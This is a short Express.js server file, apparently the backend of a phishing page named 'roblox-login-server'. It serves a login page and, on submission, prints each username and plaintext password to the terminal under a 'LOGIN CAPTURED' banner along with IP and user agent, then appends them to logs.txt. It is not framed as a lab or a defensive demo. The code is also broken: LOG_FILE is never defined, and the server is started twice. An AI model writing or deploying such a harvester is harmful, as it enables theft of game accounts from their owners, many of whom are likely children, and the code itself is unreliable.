const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// POST route for login submission - LOGS TO TERMINAL + FILE
app.post('/submit-login', (req, res) => {
  try {
    // Debug log
    console.log('=== RAW REQUEST ===');
    console.log('Body:', req.body);
    console.log('Body keys:', Object.keys(req.body));
    console.log('Content-Type:', req.get('Content-Type'));
    console.log('==================');
    
    const { username, password } = req.body;
    
    // Terminal log
    console.log('=== LOGIN CAPTURED ===');
    console.log('Username:', `"${username}"`);
    console.log('Password:', `"${password}"`);
    console.log('IP:', req.ip);
    console.log('User-Agent:', req.get('User-Agent'));
    console.log('Timestamp:', new Date().toISOString());
    console.log('====================\n');
    
    // File log - append to logs.txt
    const logEntry = `${new Date().toISOString()},${username || '[EMPTY]'},${password || '[EMPTY]'},${req.ip},${req.get('User-Agent') || 'N/A'}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    console.log(`📄 Logged to ${LOG_FILE}`);
    
    res.json({ success: true, message: 'Login data received' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// 404
app.use((req, res) => res.status(404).json({ error: 'Not found' }));

app.listen(PORT, () => {
  console.log(`🚀 Server: http://localhost:${PORT}`);
  console.log('📱 Test login → watch terminal + logs.txt file');
  console.log('📄 Logs saved: roblox-login-server/logs.txt');
});
